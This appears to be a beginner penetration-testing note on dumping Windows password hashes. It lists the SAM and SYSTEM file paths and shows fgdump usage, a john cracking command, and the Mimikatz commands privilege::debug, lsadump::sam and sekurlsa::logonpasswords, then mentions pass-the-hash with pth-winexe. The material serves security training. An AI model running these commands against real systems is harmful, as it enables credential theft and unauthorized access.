---
title: "Dumping SAM file"
classes: single
ribbon: LightBlue
categories:
  - notes
tags:
  - beginner
  - pentest
  - recon
  - oscp
  - hashes
  - privesc
  - password
  - secure
  - system
  - sam
toc: true
hide_title: true
excerpt: ""
---

**Windows stores password hashes in the Security Account Manager (SAM).**

The hashes are encrypted with a key which can be found in a file named SYSTEM.

If you have the ability to read the SAM and SYSTEM files, you can extract the hashes. A very common way of capturing hashed passwords on older Windows systems is to dump the Security Account Manager (SAM) file. The Security Account Manager is a database file in Windows XP, Windows Vista, Windows 7, 8.1 and 10 that stores user passwords. It can be used to authenticate local and remote users on the system.

## SAM/SYSTEM Locations

```
C:\Windows\System32\config

C:\Windows\Repair 
C:\Windows\System32\config\RegBack
# Backup files , can be found 
```

## Extracting Password hashes from SAM file

The SAM file cannot be accessed directly while Windows is running because it’s locked by the Windows operating system. However, **there are several tools available for extracting the password hashes from memory such as pwdump, fgdump** and, if you have a Meterpreter session on the system (or you set one up), you can also use the hashdump post-exploitation module.

### fgdump.exe

```
/usr/share/windows/windows-binaries/fgdump/fgdump.exe
```

Transfer it to target and run it , **and '**127.0.0.pwdump' file will created in the same directory with hashes inside it

### Cracking hashes with john

```
john --wordlist=/usr/share/john/password.lst /root/Desktop/hashes.txt
```

### Mimikatz **(Need Admin Access)**

**Executing mimikatz**

```
mimikatz.exe -m
```

### Extracting password with sekurlsa

To interact with LSASS and capture credentials from memory, Mimikatz needs:

- An administrator account to get debug privileges via **privilege::debug,** or;
- A SYSTEM account via post exploitation/privilege escalation. In this case the debug privilege is not necessary.

```
$ privilege::debug

Privilege ‘20’ OK
```

When the user account that is **running Mimikatz does not have administrative privileges and is therefore unable to access the LSASS service,** Mimikatz will throw the following error:

**Error: ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061**

Note: If you’re running the debug command on a shell as NT AUTHORITY/SYSTEM, Mimikatz will also throw an error but it won’t prevent you from accessing LSASS with Mimikatz to dump credentials:

**ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000022**

```
lsadump::sam

sekurlsa::logonpasswords
```

We can use this dumped hashes with `pth-winexe` to gain access